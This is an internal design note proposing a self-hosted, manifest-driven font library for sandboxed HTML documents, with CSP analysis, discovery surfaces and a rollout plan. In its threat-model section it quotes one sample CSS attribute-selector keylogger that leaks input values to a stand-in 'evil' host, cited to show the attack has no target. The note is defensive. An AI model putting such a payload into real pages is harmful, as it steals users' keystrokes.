# Supporting a curated font library — design note

**Status:** **PROPOSED.** This note weighs how to give agents a large, trusted font
library for more expressive HTML documents *without* softening the render wall. The
verdict it argues for: **self-host a curated set of open-licensed families from our own
origin.** That keeps `default-src 'none'` and the no-phone-home guarantee fully intact
(the reader's browser never talks to a third party), needs **no CSP change** for the
minimum-viable version (`font-src 'self'` is already present), and is *strictly better*
than the `data:`-font path agents have today because font bytes stop bloating stored
documents. Blanket-allowlisting Google Fonts hosts in the CSP is analyzed and
**rejected**; a Worker-side Google Fonts **proxy** is analyzed and **deferred** as the
"whole library" upgrade seam.

This note follows the shape of
[`style-support-design.md`](style-support-design.md) and
[`source-retention-design.md`](source-retention-design.md): motivation → current state →
risk → mechanism → discovery → recommendation → deferred.

---

## 1. Motivation

As of sanitizer v1.4, HTML documents can carry `<style>` blocks — `class`-driven
theming, `:hover`, `@media`, `@keyframes`, `prefers-color-scheme`
([`style-support-design.md`](style-support-design.md)). Typography is the one axis that
unlock *doesn't* reach: an author can pick colors, layout, and motion, but is stuck with
the platform-default `system-ui` / web-safe stack for actual letterforms. A display face
for a poster, a proper serif for long-form reading, a specific mono for a code sample —
none are expressible without shipping the font bytes, and today the only way to ship
them is a `data:`-URI `@font-face` (§2), which is clumsy and expensive.

Fonts are a large, low-risk lever on how finished a document *feels*. The goal is to
give agents access to a broad, trusted, free library (the aesthetic reach of Google
Fonts) while treating the render wall as non-negotiable. This note is about finding that
balance point, not about softening the sandbox to get there.

## 2. Starting state

- **`data:`-URI fonts already work.** `RAW_CSP` (`src/serve.ts`, the policy on
  `GET /d/:id/raw`) is:

  ```
  default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline' data:;
  font-src 'self' data:; frame-ancestors 'self'; base-uri 'none'; form-action 'none'
  ```

  `font-src … data:` means an author can already write
  `@font-face { src: url(data:font/woff2;base64,…) }` inside a `<style>` block and it
  renders. This is the fully-self-contained, zero-network font path **today**. Its cost
  is bytes: a base64'd woff2 weight is ~30–100 KB embedded **inside the stored HTML**,
  which counts against both the document size and the fleet storage cap, and is
  re-transmitted on every read/edit.
- **`font-src 'self'` is live but unused.** Nothing is served from our origin under
  `/fonts` today, so the `'self'` source currently matches nothing. Standing this up is
  the whole of the minimum-viable feature — **no CSP edit required.**
- **External fonts are blocked, by design.** No external origin appears in any directive.
  A `<link href="https://fonts.googleapis.com/…">` (external stylesheet) is blocked by
  `style-src` having no host, and a gstatic `@font-face src: url(https://…)` is blocked
  by `font-src` having no external origin. Both surface in the write response's
  `will_not_render[]` advisory (added in v1.4).
- **`style-src` has no `'self'`.** Only `'unsafe-inline'` — so even a *same-origin*
  `<link rel="stylesheet" href="/fonts/inter.css">` is blocked today. This is the single
  lever that decides authoring ergonomics (§6.2).
- **The sandboxed iframe still loads `'self'` subresources.** `SANDBOX =
  "allow-popups allow-popups-to-escape-sandbox"` — no `allow-scripts`, no
  `allow-same-origin`, so the framed document has an *opaque* origin. CSP `'self'`
  nonetheless resolves to the **serving** origin (the document's URL,
  `slopcafe.com/d/…/raw`), not the opaque sandbox origin — which is exactly why
  `img-src 'self'` already works. A `/fonts/*.woff2` under `font-src 'self'` loads the
  same way. (Pinned as a verification step in §7 — it is the one non-obvious runtime
  claim.)
- **Raw docs carry `nosniff` + `no-store`** (`COMMON_HEADERS`, `src/serve.ts`). Two
  consequences for this design: (a) font files want the *opposite* caching — long,
  immutable `max-age` — so the `/fonts` route needs its own headers, not
  `COMMON_HEADERS`; and (b) `nosniff` on `/raw` is what makes a *future* `style-src 'self'`
  safe: a document (served `text/html`) can't be abused as a same-origin
  `<link rel=stylesheet>` because the MIME mismatch is refused under `nosniff` (§6.2).

## 3. Risk analysis — why "just allowlist Google Fonts" is the wrong default

The tempting one-liner is Option C below: add the Google hosts to the CSP. It is five
lines and delivers the entire library instantly. It is also the only option that
**softens the wall**, and the softening buys nothing the self-hosted path doesn't also
deliver. Walking the threat model:

**The classic CSS/font exfiltration attacks have no target here.** Attribute-selector
keyloggers (`input[value^="a"]{background:url(//evil/a)}`), `unicode-range` font
side-channels that detect which glyphs a page contains, `@font-face` timing oracles —
every one of them needs *either* an external load *or* a DOM secret to leak, and a
published document has **neither**: it is static, has no user input, no injected token,
no `<input>` survives sanitization, and the author already knows 100% of the content.
This is the same reasoning [`style-support-design.md`](style-support-design.md) §4 used
for `<style>` generally; fonts don't change it.

**What is genuinely new with *external* fonts is privacy, not XSS:**

| Concern | Self-host (A/B) | Direct allowlist (C) |
|---|---|---|
| **Reader IP / UA / timing leaked to a third party** on every view | **No** — the browser only ever talks to our origin | **Yes** — every reader's browser hits `fonts.gstatic.com`; the document becomes a beacon the reader never consented to. (Google Fonts hotlinking was ruled a GDPR violation in Germany in 2022 for exactly this.) |
| **Third-party availability / integrity dependency** | **No** — we serve the bytes | **Yes** — Google serves the bytes; an outage or a changed file changes our documents |
| **Holes punched in `default-src 'none'`** | **None** (`font-src 'self'` already present) | **Two** new host sources (`style-src …googleapis.com; font-src …gstatic.com`), and `googleapis.com` is a broad surface |
| **Font-parser CVEs** (rasterizer bugs) | Same exposure as `data:` fonts — already an accepted browser-0-day-class residual in [`../security-model.md`](../security-model.md); curated bytes are *lower* risk than arbitrary | Same, plus the bytes are outside our control |

The whole point of `default-src 'none'` is that a Slopcafe document **can't phone home
or beacon its reader.** Option C trades that guarantee away for convenience that Options
A and B provide *without* the trade. So the balance point is clear: **keep fonts
same-origin.** The only real question is curated-subset (A) vs. whole-library-proxy (B),
and that's an ergonomics/effort call, not a security one.

## 4. The three options

**Option A — Self-host a curated library. (Recommended, §6.)** Serve a hand-picked set
of open-licensed families (most top Google Fonts are OFL / Apache-2.0 — Inter, Source
Serif, Lora, IBM Plex, JetBrains Mono, …) from `GET /fonts/…` off R2 or a bundled asset.
`font-src 'self'` already permits it. Wins: no reader-IP leak, no external dependency,
font bytes are separate cacheable subresources that **don't count against the document or
storage cap** (the opposite of the `data:` path), and we control licensing, subsetting,
and the catalog. Cost: we choose and host a finite set (a full Google Fonts mirror is
~1,900 families / many GB — but a curated 15–30 covers the vast majority of real needs).

**Option B — Proxy Google Fonts through the Worker. (Deferred upgrade, §8.)** The Worker
fetches Google's CSS, rewrites the `gstatic` URLs to same-origin `/fonts/proxy/…`, and
caches. Gives the *whole* library with no reader-IP leak (Google sees the Worker's IP,
not the reader's), still under `font-src 'self'`. Cost: real engineering — CSS rewriting,
a caching layer + cap accounting, cache invalidation, and a licensing story for
arbitrary families. Good as a phase-2 upgrade if the curated set proves too limiting.

**Option C — Allowlist Google hosts in the CSP directly. (Rejected, §3.)** Full library,
five lines, and the only option that leaks every reader's IP to Google and widens
`default-src 'none'`. Pure downside over A/B; not pursued.

## 5. Discovery — how an agent learns what fonts exist

This is the harder half of the design. Serving the bytes is easy; the feature is only
usable if an agent **knows the family names, weights, and the exact snippet to write.**

### 5.1 Where the publishing guide appears

The authoring contract (`skills/publishing.md`) reaches agents through **three** surfaces:

1. **Bundled skill** — the `slopcafe-publishing` skill (its frontmatter). An agent with
   the skill installed has the guide in context.
2. **On-platform mirror document** — published as `slopcafe-publishing-guide` (slug;
   public_id `FLBUGmgWajRyjUl8NtHR7A`) via `scripts/doc-web.mjs`, so a *connector* agent
   with no repo access can `read_document` it on demand.
3. **MCP tool-description pointers** — the write tools name the guide and its
   non-negotiables (the length-trimmed CSS/self-contained rules).

So the guide is the natural home for **font rules and usage** — it already owns the CSS
section and the existing `@font-face`-with-`data:` mention (`publishing.md` "CSS rules").
**But it is the wrong home for the mutable *catalog*.**

### 5.2 The drift problem

A static list of 20 family names + weights baked into `publishing.md` has two failure
modes:

- **It rots.** Every time the catalog changes (add a family, add a weight, drop one), the
  guide, its on-platform mirror, and possibly the tool descriptions must all be
  re-published in lockstep — exactly the multi-surface sync burden `CLAUDE.md` already
  warns about. A font list is *data*, and data embedded in prose drifts.
- **A cold MCP agent may never read it.** Connector clients surface tools but rarely
  fetch the guide document on their own. An agent needs a way to discover the catalog
  *at authoring time* without having pre-read a 900-line skill.

### 5.3 Proposed solution: one manifest, three projections

Make a **font catalog manifest the single source of truth**, and derive every
human/agent-facing surface from it:

```
fonts/catalog.json      ← the source of truth (family → {weights, styles, files, license, subsets})
```

The manifest drives three things, so they can never disagree:

1. **The serving route** — `/fonts/*` serves only files the manifest declares (it *is*
   the file index). Adding a family is a manifest edit + the woff2 bytes; nothing else.
2. **A generated on-platform catalog document** — slug **`slopcafe-fonts`**, auto-built
   from the manifest and byte-exact re-published like the rest of the doc web
   (`scripts/doc-web.mjs`). This page is the **live, always-current** answer to "what
   fonts can I use," and it doubles as a *specimen sheet*: each family is rendered **in
   itself** (the page uses the very fonts it documents — the best possible demo of the
   feature) next to a copy-paste snippet. An agent fetches one document and has the whole
   catalog, current by construction.
3. **`publishing.md` (+ its mirror)** — carries the **rules and a short curated
   sampler**, then points at `/s/slopcafe-fonts` for the full, live list. The guide
   teaches *how* to use fonts (the snippet shape, the self-contained rule, licensing/attribution
   note); the catalog doc answers *which* are available. Rules are stable; the list is not
   — so only the stable half lives in prose.

Plus a **one-line pointer in the MCP write-tool descriptions**: e.g. *"Self-hosted
custom fonts are available — see the catalog at `/s/slopcafe-fonts`."* One line, no list,
survives length-trimming, and gives even a cold agent the thread to pull.

**Verdict on the user's question:** yes, `publishing.md` is the right *primary* surface —
it's where all CSS/font authoring rules already live — but it should hold the **rules +
a pointer**, not the catalog. The mutable catalog belongs in the generated
`slopcafe-fonts` document so it never drifts, with the tool-description one-liner as the
cold-start breadcrumb.

## 6. Mechanism (recommended: Option A)

### 6.1 Serving

- **Route:** `GET /fonts/:family/:file` (e.g. `/fonts/inter/inter-latin-400-normal.woff2`),
  dispatched in `innerHandler` (`src/index.ts`) alongside the other exact-match routes.
  Public, no auth — fonts are non-secret static assets (a document already served under a
  capability URL references them; the font bytes carry no document content).
- **Storage:** either an R2 prefix (`fonts/…` in the existing `DOCS` bucket, or a
  dedicated bucket) or a bundled Worker asset. R2 keeps the Worker bundle small and lets
  the catalog grow without redeploys; a bundled asset is simpler but bloats the bundle.
  **Lean R2** for growth headroom.
- **Headers (NOT `COMMON_HEADERS`):** `content-type: font/woff2`,
  `cache-control: public, max-age=31536000, immutable` (filenames are content-stable),
  `x-content-type-options: nosniff`, `access-control-allow-origin: *` (fonts are fetched
  by the opaque-origin sandboxed frame — a permissive CORS/`crossorigin` posture avoids
  tainting; verify in §7). **No `no-store`** — the whole caching win depends on it.
- **Format:** ship **woff2 only** (universal in every target browser; ~30% smaller than
  woff). **Subset** to `latin` (+ `latin-ext` where cheap) to keep weights ~15–30 KB.
  Full-Unicode CJK faces are out of scope for v1 (megabytes each) — revisit per-demand.
- **Licensing:** curate to OFL / Apache-2.0 only; ship the license texts under
  `fonts/licenses/` and surface attribution on the `slopcafe-fonts` page. The bypass-corpus
  precedent (third-party assets carry their own attribution, out of the Apache grant —
  `CLAUDE.md`) applies: font binaries are **not** under the repo's Apache header, and
  `.woff2` takes no SPDX header (binary).

### 6.2 Authoring ergonomics — two tiers

The agent references a font from inside a `<style>` block. Two tiers, differing only in
whether we touch `style-src`:

- **Tier 1 — inline `@font-face` (zero CSP change; ship this first).** The agent writes
  the `@font-face` themselves, pointing at our origin:

  ```html
  <style>
    @font-face { font-family:'Inter'; font-weight:400;
                 src:url('/fonts/inter/inter-latin-400-normal.woff2') format('woff2'); }
    body { font-family:'Inter', system-ui, sans-serif; }
  </style>
  ```

  Works **today** under `font-src 'self'`. The `slopcafe-fonts` catalog gives copy-paste
  `@font-face` blocks per family so this is a paste, not a recall. Verbose for
  many-weight use, but fully within the existing wall.

- **Tier 2 — same-origin stylesheet `<link>` (optional; adds `style-src 'self'`).** Serve
  a per-family sheet `GET /fonts/inter.css` containing its `@font-face` rules, and add
  `'self'` to `style-src` so the agent writes one line:

  ```html
  <link rel="stylesheet" href="/fonts/inter.css">
  <style> body { font-family:'Inter', system-ui, sans-serif; } </style>
  ```

  **Security delta is minimal and same-origin-only:** `style-src 'self'` permits
  stylesheets *from our origin only* — no third party, no exfil channel (a same-origin
  sheet can do nothing an inline `<style>` can't already do). The one thing to rule out —
  loading a *document* (`/d/:id/raw`, served `text/html`) as a stylesheet — is already
  blocked by the `nosniff` on raw responses (§2): a MIME mismatch under `nosniff` is
  refused. So Tier 2 is a clean ergonomic upgrade, not a wall softening. **Recommendation:
  ship Tier 1, add Tier 2 if the inline-`@font-face` verbosity proves annoying in practice.**

### 6.3 Cap and cost interaction

Self-hosted fonts are **separate subresources on our origin**, so — unlike `data:` fonts
— they do **not** inflate the stored document, the `size_bytes` cap, or the fleet storage
cap, and they're cached across every document that uses them (one Inter-400 download
serves the whole corpus). This is a real ergonomic *and* cost win over the status-quo
`data:` path, independent of the aesthetic gain.

## 7. Recommendation & rollout

**Recommended:** Option A, Tier 1 — a curated, self-hosted, woff2 library under
`/fonts/*` with a manifest-driven `slopcafe-fonts` catalog document as the discovery
surface; keep `default-src 'none'` and `font-src 'self'` exactly as they are. Treat Tier 2
(`style-src 'self'` + per-family `.css`) as a low-risk ergonomic follow-up and Option B
(Google Fonts proxy) as the deferred "whole library" seam (§8).

**Rollout checklist** (honoring the `CLAUDE.md` same-commit sync rules when built):

- `fonts/catalog.json` + the curated woff2 set + `fonts/licenses/`.
- `GET /fonts/:family/:file` in `src/index.ts` (+ its own cache/CORS headers, §6.1);
  extend `src/openapi.ts` `ROUTES` (bump `EXPECTED_ROUTES` in `test/openapi.test.mjs`)
  and bump `OPENAPI_INFO_VERSION` (additive → **MINOR**).
- **Docs (same commit):** `publishing.md` "CSS rules" gains a **Fonts** subsection (rules
  + sampler + pointer to `/s/slopcafe-fonts`); `docs/http-api.md` documents the `/fonts`
  route; the MCP write-tool descriptions get the one-line catalog pointer (§5.3);
  `docs/security-model.md` notes fonts stay same-origin (wall unchanged);
  `CLAUDE.md` gains a "Where things live" bullet + a storage-model note; the SOLO spec's
  "no external fonts" sentence is refined to "curated self-hosted fonts, still no external
  origin."
- **Doc web:** generate + publish `slopcafe-fonts`; add it **and this note** to
  `scripts/doc-web-map.json` (this note flips public when built — it is deliberately
  *not* mapped while `PROPOSED`).
- **Verification (`wrangler dev`):** publish an HTML doc with an inline `@font-face`
  pointing at `/fonts/…`, load `/d/:id/raw`, and confirm in devtools that **the font
  request succeeds under the sandboxed frame's `font-src 'self'`** (the one non-obvious
  runtime claim, §2) and the glyphs render; confirm the font response is `immutable`-cached
  and CORS-clean; confirm an *external* `@font-face src` still shows CSP-blocked +
  `will_not_render[]`. If Tier 2 ships, additionally confirm `/fonts/inter.css` loads via
  `<link>` under `style-src 'self'` while a `text/html` doc URL is *refused* as a
  stylesheet (nosniff).

## 8. Deferred / future

- **Google Fonts proxy (Option B)** — the whole-library upgrade, same-origin and
  privacy-preserving, gated only on the CSS-rewrite + caching engineering (§4). The
  serving/discovery layout here is forward-compatible: a proxied family is just another
  manifest entry + a `/fonts/proxy/*` byte source, so the catalog doc and authoring
  snippets don't change shape.
- **Variable fonts** — one file, all weights/optical sizes; a nice size win, but the
  `@font-face` `font-variation-settings` story and per-axis subsetting want their own
  pass. Curated static weights first.
- **CJK / large-Unicode faces** — deferred on size (megabytes/face); revisit with
  unicode-range subsetting if demand appears.
- **Font-family allowlist / validation** — not needed: unknown `font-family` names simply
  fall back to the CSS stack, so there's nothing to reject. The catalog is guidance, not a
  gate.
